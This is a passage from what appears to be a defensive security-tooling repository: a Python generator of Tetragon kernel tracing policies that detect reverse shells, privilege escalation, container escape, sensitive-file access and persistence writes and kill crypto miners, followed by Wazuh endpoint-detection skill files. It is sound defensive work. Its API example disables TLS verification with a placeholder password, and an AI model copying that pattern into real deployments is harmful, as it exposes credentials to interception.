    results["kernel_version"] = kernel_version
    results["btf_available"] = btf_available
    return results


def generate_file_access_policy(
    name="monitor-sensitive-file-access",
    files=None,
    action="Post",
    namespace=None,
):
    """Generate a TracingPolicy for monitoring file access via fd_install kprobe."""
    if files is None:
        files = SENSITIVE_FILES

    policy = {
        "apiVersion": "cilium.io/v1alpha1",
        "kind": "TracingPolicyNamespaced" if namespace else "TracingPolicy",
        "metadata": {"name": name},
        "spec": {
            "kprobes": [
                {
                    "call": "fd_install",
                    "syscall": False,
                    "args": [
                        {"index": 0, "type": "int"},
                        {"index": 1, "type": "file"},
                    ],
                    "selectors": [
                        {
                            "matchArgs": [
                                {
                                    "index": 1,
                                    "operator": "Prefix",
                                    "values": files,
                                }
                            ],
                            "matchActions": [{"action": action}],
                        }
                    ],
                }
            ]
        },
    }
    if namespace:
        policy["metadata"]["namespace"] = namespace
    return policy


def generate_network_monitor_policy(
    name="monitor-tcp-connections",
    binaries=None,
    action="Post",
):
    """Generate a TracingPolicy for monitoring TCP connections via tcp_connect kprobe."""
    kprobe = {
        "call": "tcp_connect",
        "syscall": False,
        "args": [{"index": 0, "type": "sock"}],
        "selectors": [{"matchActions": [{"action": action}]}],
    }
    if binaries:
        kprobe["selectors"][0]["matchBinaries"] = [
            {"operator": "In", "values": binaries}
        ]

    policy = {
        "apiVersion": "cilium.io/v1alpha1",
        "kind": "TracingPolicy",
        "metadata": {"name": name},
        "spec": {"kprobes": [kprobe]},
    }
    return policy


def generate_privilege_escalation_policy(
    name="detect-privilege-escalation",
    action="Post",
):
    """Generate a TracingPolicy for detecting setuid(0) and commit_creds calls."""
    policy = {
        "apiVersion": "cilium.io/v1alpha1",
        "kind": "TracingPolicy",
        "metadata": {"name": name},
        "spec": {
            "kprobes": [
                {
                    "call": "__sys_setuid",
                    "syscall": False,
                    "args": [{"index": 0, "type": "int"}],
                    "selectors": [
                        {
                            "matchArgs": [
                                {
                                    "index": 0,
                                    "operator": "Equal",
                                    "values": ["0"],
                                }
                            ],
                            "matchActions": [{"action": action}],
                        }
                    ],
                },
                {
                    "call": "commit_creds",
                    "syscall": False,
                    "args": [{"index": 0, "type": "cred"}],
                    "selectors": [{"matchActions": [{"action": action}]}],
                },
            ]
        },
    }
    return policy


def generate_crypto_miner_enforcement_policy(
    name="enforce-no-crypto-miners",
    miners=None,
):
    """Generate a TracingPolicy that kills crypto miner processes via Sigkill."""
    if miners is None:
        miners = CRYPTO_MINERS

    policy = {
        "apiVersion": "cilium.io/v1alpha1",
        "kind": "TracingPolicy",
        "metadata": {"name": name},
        "spec": {
            "kprobes": [
                {
                    "call": "sys_execve",
                    "syscall": True,
                    "args": [{"index": 0, "type": "string"}],
                    "selectors": [
                        {
                            "matchArgs": [
                                {
                                    "index": 0,
                                    "operator": "Postfix",
                                    "values": miners,
                                }
                            ],
                            "matchActions": [{"action": "Sigkill"}],
                        }
                    ],
                }
            ]
        },
    }
    return policy


def generate_reverse_shell_detection_policy(
    name="detect-reverse-shells",
    binaries=None,
    action="Post",
):
    """Generate a TracingPolicy for detecting reverse shell network connections."""
    if binaries is None:
        binaries = SUSPICIOUS_BINARIES

    policy = {
        "apiVersion": "cilium.io/v1alpha1",
        "kind": "TracingPolicy",
        "metadata": {"name": name},
        "spec": {
            "kprobes": [
                {
                    "call": "tcp_connect",
                    "syscall": False,
                    "args": [{"index": 0, "type": "sock"}],
                    "selectors": [
                        {
                            "matchBinaries": [
                                {"operator": "In", "values": binaries}
                            ],
                            "matchActions": [{"action": action}],
                        }
                    ],
                }
            ]
        },
    }
    return policy


def generate_container_escape_policy(
    name="detect-container-escape",
    paths=None,
    action="Post",
):
    """Generate a TracingPolicy for detecting container escape attempts."""
    if paths is None:
        paths = CONTAINER_ESCAPE_PATHS

    policy = {
        "apiVersion": "cilium.io/v1alpha1",
        "kind": "TracingPolicy",
        "metadata": {"name": name},
        "spec": {
            "kprobes": [
                {
                    "call": "sys_openat",
                    "syscall": True,
                    "args": [
                        {"index": 0, "type": "int"},
                        {"index": 1, "type": "string"},
                    ],
                    "selectors": [
                        {
                            "matchArgs": [
                                {
                                    "index": 1,
                                    "operator": "Prefix",
                                    "values": paths,
                                }
                            ],
                            "matchActions": [{"action": action}],
                        }
                    ],
                },
                {
                    "call": "sys_mount",
                    "syscall": True,
                    "args": [
                        {"index": 0, "type": "string"},
                        {"index": 1, "type": "string"},
                        {"index": 2, "type": "string"},
                    ],
                    "selectors": [{"matchActions": [{"action": action}]}],
                },
            ]
        },
    }
    return policy


def generate_write_monitoring_policy(
    name="monitor-sensitive-file-writes",
    paths=None,
    action="Post",
):
    """Generate a TracingPolicy for monitoring file writes to sensitive paths."""
    if paths is None:
        paths = [
            "/etc/",
            "/root/",
            "/var/spool/cron/",
            "/etc/cron.d/",
            "/etc/systemd/system/",
            "/usr/lib/systemd/system/",
        ]

    policy = {
        "apiVersion": "cilium.io/v1alpha1",
        "kind": "TracingPolicy",
        "metadata": {"name": name},
        "spec": {
            "kprobes": [
                {
                    "call": "sys_write",
                    "syscall": True,
                    "args": [
                        {"index": 0, "type": "fd"},
                        {"index": 1, "type": "char_buf",
                         "sizeArgIndex": 3, "returnCopy": True},
                        {"index": 2, "type": "size_t"},
                    ],
                    "selectors": [
                        {
                            "matchArgs": [
                                {
                                    "index": 0,
                                    "operator": "Prefix",
                                    "values": paths,
                                }
                            ],
                            "matchActions": [{"action": action}],
                        }
                    ],
                }
            ]
        },
    }
    return policy


def apply_policy(policy, dry_run=False):
    """Apply a TracingPolicy to the Kubernetes cluster or write to file."""
    policy_yaml = yaml.dump(policy, default_flow_style=False)

    if dry_run:
        return {"status": "dry_run", "yaml": policy_yaml}

    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".yaml", delete=False
    ) as f:
        f.write(policy_yaml)
        temp_path = f.name

    try:
        result = subprocess.run(
            ["kubectl", "apply", "-f", temp_path],
            capture_output=True,
            text=True,
            timeout=30,
        )
        return {
            "status": "applied" if result.returncode == 0 else "failed",
            "stdout": result.stdout.strip(),
            "stderr": result.stderr.strip(),
            "yaml": policy_yaml,
        }
    except (FileNotFoundError, subprocess.TimeoutExpired) as e:
        return {"status": "error", "error": str(e), "yaml": policy_yaml}
    finally:
        os.unlink(temp_path)


def list_tracing_policies():
    """List all TracingPolicy resources in the cluster."""
    try:
        result = subprocess.run(
            ["kubectl", "get", "tracingpolicies", "-o", "json"],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if result.returncode != 0:
            return {"status": "error", "stderr": result.stderr.strip()}
        policies = json.loads(result.stdout)
        return {
            "status": "ok",
            "count": len(policies.get("items", [])),
            "policies": [
                {
                    "name": p["metadata"]["name"],
                    "created": p["metadata"].get("creationTimestamp", ""),
                }
                for p in policies.get("items", [])
            ],
        }
    except (FileNotFoundError, subprocess.TimeoutExpired, json.JSONDecodeError) as e:
        return {"status": "error", "error": str(e)}


def stream_events(output_format="compact", event_filter=None, limit=100):
    """Stream Tetragon events using the tetra CLI."""
    cmd = ["tetra", "getevents", "-o", output_format]
    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        events = []
        for i, line in enumerate(proc.stdout):
            if i >= limit:
                break
            line = line.strip()
            if not line:
                continue
            if output_format == "json":
                try:
                    event = json.loads(line)
                    if event_filter and event_filter not in json.dumps(event):
                        continue
                    events.append(event)
                except json.JSONDecodeError:
                    continue
            else:
                if event_filter and event_filter not in line:
                    continue
                events.append(line)
        proc.terminate()
        return {"status": "ok", "event_count": len(events), "events": events}
    except FileNotFoundError:
        return {"status": "error", "error": "tetra CLI not found"}


def parse_tetragon_log(log_path, event_types=None):
    """Parse a Tetragon JSON log file and extract security-relevant events."""
    if not os.path.exists(log_path):
        return {"status": "error", "error": f"Log file not found: {log_path}"}

    if event_types is None:
        event_types = ["process_exec", "process_kprobe", "process_exit"]

    events = {"total": 0, "by_type": {}}
    alerts = []

    with open(log_path) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                event = json.loads(line)
            except json.JSONDecodeError:
                continue

            events["total"] += 1

            for etype in event_types:
                if etype in event:
                    events["by_type"].setdefault(etype, 0)
                    events["by_type"][etype] += 1

                    if etype == "process_kprobe":
                        kprobe_data = event[etype]
                        policy_name = kprobe_data.get("policy_name", "")
                        func = kprobe_data.get("function_name", "")
                        binary = (
                            kprobe_data.get("process", {}).get("binary", "")
                        )
                        alerts.append(
                            {
                                "type": etype,
                                "policy": policy_name,
                                "function": func,
                                "binary": binary,
                                "time": event.get("time", ""),
                            }
                        )

    return {
        "status": "ok",
        "events": events,
        "security_alerts": alerts[:100],
    }


def generate_helm_values(
    enable_process_cred=True,
    enable_process_ns=True,
    export_file="/var/log/tetragon/tetragon.log",
    export_max_size_mb=100,
    export_max_backups=5,
    resources_cpu="500m",
    resources_memory="512Mi",
):
    """Generate Helm values YAML for Tetragon deployment."""
    values = {
        "tetragon": {
            "enableProcessCred": enable_process_cred,
            "enableProcessNs": enable_process_ns,
            "exportFilename": export_file,
            "exportFileMaxSizeMB": export_max_size_mb,
            "exportFileMaxBackups": export_max_backups,
            "resources": {
                "requests": {"cpu": "100m", "memory": "128Mi"},
                "limits": {"cpu": resources_cpu, "memory": resources_memory},
            },
        },
        "tetragonOperator": {
            "enabled": True,
        },
        "export": {
            "stdout": {"enabledCommand": True, "enabledArgs": True},
        },
    }
    return yaml.dump(values, default_flow_style=False)


def generate_full_monitoring_suite(output_dir, dry_run=False):
    """Generate a complete suite of TracingPolicies for security monitoring."""
    os.makedirs(output_dir, exist_ok=True)

    policies = {
        "01-file-access-monitor.yaml": generate_file_access_policy(),
        "02-network-monitor.yaml": generate_network_monitor_policy(),
        "03-privilege-escalation-detect.yaml": generate_privilege_escalation_policy(),
        "04-crypto-miner-enforcement.yaml": generate_crypto_miner_enforcement_policy(),
        "05-reverse-shell-detect.yaml": generate_reverse_shell_detection_policy(),
        "06-container-escape-detect.yaml": generate_container_escape_policy(),
        "07-sensitive-write-monitor.yaml": generate_write_monitoring_policy(),
    }

    results = []
    for filename, policy in policies.items():
        filepath = os.path.join(output_dir, filename)
        policy_yaml = yaml.dump(policy, default_flow_style=False)
        with open(filepath, "w") as f:
            f.write(policy_yaml)
        results.append(
            {
                "file": filepath,
                "policy_name": policy["metadata"]["name"],
                "kprobe_count": len(policy["spec"]["kprobes"]),
            }
        )

    helm_values_path = os.path.join(output_dir, "helm-values.yaml")
    with open(helm_values_path, "w") as f:
        f.write(generate_helm_values())
    results.append({"file": helm_values_path, "type": "helm-values"})

    summary = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "output_dir": output_dir,
        "policy_count": len(policies),
        "policies": results,
        "dry_run": dry_run,
    }
    return summary


def install_tetragon_helm(namespace="kube-system", values_file=None, dry_run=False):
    """Install or upgrade Tetragon via Helm."""
    cmd = [
        "helm", "upgrade", "--install", "tetragon",
        "cilium/tetragon", "-n", namespace,
    ]
    if values_file:
        cmd.extend(["-f", values_file])
    else:
        cmd.extend([
            "--set", "tetragon.enableProcessCred=true",
            "--set", "tetragon.enableProcessNs=true",
        ])
    if dry_run:
        cmd.append("--dry-run")

    try:
        add_repo = subprocess.run(
            ["helm", "repo", "add", "cilium", "https://helm.cilium.io"],
            capture_output=True, text=True, timeout=30,
        )
        subprocess.run(
            ["helm", "repo", "update"],
            capture_output=True, text=True, timeout=60,
        )
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        return {
            "status": "installed" if result.returncode == 0 else "failed",
            "stdout": result.stdout.strip(),
            "stderr": result.stderr.strip(),
        }
    except (FileNotFoundError, subprocess.TimeoutExpired) as e:
        return {"status": "error", "error": str(e)}


def verify_installation(namespace="kube-system"):
    """Verify Tetragon is running correctly in the cluster."""
    checks = {}

    try:
        result = subprocess.run(
            ["kubectl", "get", "pods", "-n", namespace,
             "-l", "app.kubernetes.io/name=tetragon",
             "-o", "json"],
            capture_output=True, text=True, timeout=30,
        )
        if result.returncode == 0:
            pods = json.loads(result.stdout)
            items = pods.get("items", [])
            checks["pods"] = {
                "count": len(items),
                "statuses": [
                    {
                        "name": p["metadata"]["name"],
                        "phase": p["status"].get("phase", "Unknown"),
                        "ready": all(
                            c.get("ready", False)
                            for c in p["status"].get("containerStatuses", [])
                        ),
                    }
                    for p in items
                ],
            }
        else:
            checks["pods"] = {"error": result.stderr.strip()}
    except Exception as e:
        checks["pods"] = {"error": str(e)}

    try:
        result = subprocess.run(
            ["kubectl", "api-resources", "--api-group=cilium.io"],
            capture_output=True, text=True, timeout=30,
        )
        checks["crds_available"] = "tracingpolicies" in result.stdout.lower()
    except Exception:
        checks["crds_available"] = False

    return checks


def main():
    parser = argparse.ArgumentParser(
        description="eBPF Security Monitoring Agent - Cilium Tetragon"
    )
    parser.add_argument(
        "--action",
        choices=[
            "check",
            "install",
            "generate",
            "apply",
            "list-policies",
            "stream",
            "parse-log",
            "verify",
        ],
        default="check",
        help="Action to perform",
    )
    parser.add_argument("--output-dir", default="./tetragon-policies",
                        help="Directory for generated policies")
    parser.add_argument("--output", default="ebpf_monitoring_report.json",
                        help="Output report file")
    parser.add_argument("--dry-run", action="store_true",
                        help="Generate without applying")
    parser.add_argument("--log-path", help="Path to Tetragon log file")
    parser.add_argument("--event-filter", help="Filter events by keyword")
    parser.add_argument("--limit", type=int, default=100,
                        help="Max events to stream")
    parser.add_argument("--namespace", default="kube-system",
                        help="Kubernetes namespace")
    parser.add_argument("--values-file", help="Helm values file path")
    parser.add_argument("--policy-type",
                        choices=[
                            "file-access", "network", "privilege-escalation",
                            "crypto-miner", "reverse-shell", "container-escape",
                            "write-monitor", "all",
                        ],
                        default="all",
                        help="Type of policy to generate/apply")
    args = parser.parse_args()

    report = {"generated_at": datetime.now(timezone.utc).isoformat(), "action": args.action}

    if args.action == "check":
        prereqs = check_prerequisites()
        report["prerequisites"] = prereqs
        print(f"[*] Kernel: {prereqs['kernel_version']}")
        print(f"[*] BTF available: {prereqs['btf_available']}")
        for tool in ["kubectl", "helm", "tetra"]:
            status = "found" if prereqs[tool] else "NOT FOUND"
            print(f"[*] {tool}: {status}")

    elif args.action == "install":
        print("[+] Installing Tetragon via Helm...")
        result = install_tetragon_helm(
            namespace=args.namespace,
            values_file=args.values_file,
            dry_run=args.dry_run,
        )
        report["install"] = result
        print(f"[+] Status: {result['status']}")

    elif args.action == "generate":
        print(f"[+] Generating TracingPolicies to {args.output_dir}...")
        suite = generate_full_monitoring_suite(args.output_dir, dry_run=args.dry_run)
        report["suite"] = suite
        print(f"[+] Generated {suite['policy_count']} policies")

    elif args.action == "apply":
        policy_generators = {
            "file-access": generate_file_access_policy,
            "network": generate_network_monitor_policy,
            "privilege-escalation": generate_privilege_escalation_policy,
            "crypto-miner": generate_crypto_miner_enforcement_policy,
            "reverse-shell": generate_reverse_shell_detection_policy,
            "container-escape": generate_container_escape_policy,
            "write-monitor": generate_write_monitoring_policy,
        }
        if args.policy_type == "all":
            policies_to_apply = policy_generators
        else:
            policies_to_apply = {args.policy_type: policy_generators[args.policy_type]}

        report["applied"] = []
        for ptype, generator in policies_to_apply.items():
            policy = generator()
            result = apply_policy(policy, dry_run=args.dry_run)
            report["applied"].append({"type": ptype, "result": result})
            print(f"[+] {ptype}: {result['status']}")

    elif args.action == "list-policies":
        result = list_tracing_policies()
        report["policies"] = result
        if result["status"] == "ok":
            print(f"[+] Found {result['count']} TracingPolicies:")
            for p in result["policies"]:
                print(f"    - {p['name']} (created: {p['created']})")
        else:
            print(f"[-] Error: {result.get('error', result.get('stderr', ''))}")

    elif args.action == "stream":
        print(f"[+] Streaming up to {args.limit} events...")
        result = stream_events(
            output_format="json",
            event_filter=args.event_filter,
            limit=args.limit,
        )
        report["events"] = result
        print(f"[+] Captured {result.get('event_count', 0)} events")

    elif args.action == "parse-log":
        if not args.log_path:
            print("[-] --log-path required for parse-log action")
            sys.exit(1)
        print(f"[+] Parsing log: {args.log_path}")
        result = parse_tetragon_log(args.log_path)
        report["log_analysis"] = result
        if result["status"] == "ok":
            print(f"[+] Total events: {result['events']['total']}")
            for etype, count in result["events"]["by_type"].items():
                print(f"    {etype}: {count}")
            print(f"[+] Security alerts: {len(result['security_alerts'])}")
        else:
            print(f"[-] Error: {result['error']}")

    elif args.action == "verify":
        print("[+] Verifying Tetragon installation...")
        checks = verify_installation(args.namespace)
        report["verification"] = checks
        if "pods" in checks and isinstance(checks["pods"], dict):
            pod_info = checks["pods"]
            if "count" in pod_info:
                print(f"[+] Tetragon pods: {pod_info['count']}")
                for ps in pod_info.get("statuses", []):
                    ready_str = "READY" if ps["ready"] else "NOT READY"
                    print(f"    {ps['name']}: {ps['phase']} ({ready_str})")
            else:
                print(f"[-] Pod check error: {pod_info.get('error', 'unknown')}")
        print(f"[+] TracingPolicy CRDs available: {checks.get('crds_available', False)}")

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2, default=str)
    print(f"[+] Report saved to {args.output}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/implementing-endpoint-detection-with-wazuh/SKILL.md =====
---
name: implementing-endpoint-detection-with-wazuh
description: Deploys and configures Wazuh SIEM/XDR for endpoint detection, covering agent authentication and management, custom decoder and rule XML creation, alert querying via the Wazuh REST API, rule testing with wazuh-logtest, and automated active-response actions. Use when setting up endpoint detection and response, writing or testing custom Wazuh rules, or querying and triaging Wazuh alerts.
domain: cybersecurity
subdomain: security-operations
tags:
- siem
- xdr
- wazuh
- endpoint-detection
- custom-rules
- incident-response
version: '1.0'
author: mahipal
license: Apache-2.0
nist_ai_rmf:
- GOVERN-1.1
- MEASURE-2.7
- MANAGE-3.1
- MANAGE-2.4
- MEASURE-3.1
nist_csf:
- DE.CM-01
- RS.MA-01
- GV.OV-01
- DE.AE-02
mitre_attack:
- T1078
- T1190
- T1059
- T1685.002
- T1685.005
---
# Implementing Endpoint Detection with Wazuh

## Overview

Wazuh is an open-source SIEM and XDR platform for endpoint monitoring, threat detection, and compliance. This skill covers managing agents via the Wazuh REST API, creating custom decoders and rules in XML for organization-specific detections, querying alerts, and testing rule logic using the logtest endpoint.


## When to Use

- When deploying or configuring implementing endpoint detection with wazuh capabilities in your environment
- When establishing security controls aligned to compliance requirements
- When building or improving security architecture for this domain
- When conducting security assessments that require this implementation

## Prerequisites

- Wazuh Manager 4.x deployed with API enabled
- Python 3.9+ with `requests` library
- API credentials (username/password for JWT authentication)
- Understanding of Wazuh decoder and rule XML syntax

## Steps

### Step 1: Authenticate to Wazuh API
Obtain JWT token via POST to /security/user/authenticate.

### Step 2: List and Monitor Agents
Query agent status, versions, and last keep-alive via /agents endpoint.

### Step 3: Query Security Alerts
Search alerts by rule ID, severity, agent, or time range.

### Step 4: Test Custom Rules with Logtest
Use the /logtest endpoint to validate decoder and rule logic against sample log lines.

## Expected Output

JSON report with agent inventory, alert statistics, rule coverage, and logtest validation results.

===== END FILE =====


===== FILE: skills/implementing-endpoint-detection-with-wazuh/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/implementing-endpoint-detection-with-wazuh/references/api-reference.md =====
# API Reference: Implementing Endpoint Detection with Wazuh

## Wazuh REST API Endpoints

| Endpoint | Method | Purpose |
|----------|--------|---------|
| /security/user/authenticate | POST | Get JWT token (Basic Auth) |
| /agents | GET | List agents with status |
| /agents/summary/status | GET | Agent status summary |
| /alerts | GET | Query security alerts |
| /rules | GET | List detection rules |
| /logtest | PUT | Test log against decoders/rules |
| /manager/configuration | GET | Manager configuration |
| /agents/{id}/restart | PUT | Restart specific agent |

## Authentication

```python
import requests
from requests.auth import HTTPBasicAuth

resp = requests.post(
    "https://wazuh:55000/security/user/authenticate",
    auth=HTTPBasicAuth("wazuh-wui", "password"),
    verify=False,
)
token = resp.json()["data"]["token"]
headers = {"Authorization": f"Bearer {token}"}
```

## Custom Rule XML Syntax

```xml
<group name="custom_rules,">
  <rule id="100001" level="12">
    <if_sid>5716</if_sid>
    <srcip>!192.168.1.0/24</srcip>
    <description>SSH login from external IP</description>
    <mitre><id>T1078</id></mitre>
  </rule>
</group>
```

Location: `/var/ossec/etc/rules/local_rules.xml`

## Custom Decoder XML

```xml
<decoder name="custom_app">
  <program_name>myapp</program_name>
  <regex>^(\S+) (\S+) (\S+)</regex>
  <order>srcip,user,action</order>
</decoder>
```

Location: `/var/ossec/etc/decoders/local_decoder.xml`

## Alert Query Parameters

| Parameter | Example | Description |
|-----------|---------|-------------|
| limit | 20 | Max results |
| sort | -timestamp | Sort descending |
| q | rule.level>=10 | Filter by level |
| search | brute force | Text search |
| select | rule.id,agent.name | Field selection |

## References

- Wazuh API Docs: https://documentation.wazuh.com/current/user-manual/api/
- Wazuh Rules Syntax: https://documentation.wazuh.com/current/user-manual/ruleset/ruleset-xml-syntax/rules.html
- Wazuh Custom Rules: https://documentation.wazuh.com/current/user-manual/ruleset/rules/custom.html

===== END FILE =====


===== FILE: skills/implementing-endpoint-detection-with-wazuh/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for implementing endpoint detection with Wazuh.

Manages Wazuh agents, queries alerts, tests custom decoder/rule
logic via logtest, and audits endpoint coverage using the
Wazuh REST API.
"""

import argparse
import json
import os
from datetime import datetime
from pathlib import Path

try:
    import requests
    from requests.auth import HTTPBasicAuth
except ImportError:
    requests = None


class WazuhDetectionAgent:
    """Manages Wazuh endpoint detection via its REST API."""

    def __init__(self, wazuh_url, username, password,
                 output_dir="./wazuh_detection"):
        self.base_url = wazuh_url.rstrip("/")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings = []
        self.token = self._authenticate(username, password)

    def _authenticate(self, username, password):
        """Authenticate and obtain JWT token."""
        if not requests:
            return None
        try:
            resp = requests.post(
                f"{self.base_url}/security/user/authenticate",
                auth=HTTPBasicAuth(username, password),
                verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true", timeout=10,  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
            )
            if resp.status_code == 200:
                return resp.json().get("data", {}).get("token")
        except requests.RequestException:
            pass
        return None

    def _api(self, method, path, params=None, data=None):
        if not requests or not self.token:
            return None
        try:
            resp = requests.request(
                method, f"{self.base_url}{path}",
                headers={"Authorization": f"Bearer {self.token}"},
                params=params, json=data, verify=not os.environ.get("SKIP_TLS_VERIFY", "").lower() == "true", timeout=15,  # Set SKIP_TLS_VERIFY=true for self-signed certs in lab environments
            )
            return resp.json() if resp.status_code == 200 else None
        except requests.RequestException:
            return None

    def list_agents(self):
        """List all registered Wazuh agents with status."""
        data = self._api("GET", "/agents", params={"limit": 500, "select": "id,name,status,os.name,os.version,version,lastKeepAlive,ip"})
        if not data:
            return []
        agents = data.get("data", {}).get("affected_items", [])
        disconnected = [a for a in agents if a.get("status") == "disconnected"]
        if disconnected:
            self.findings.append({
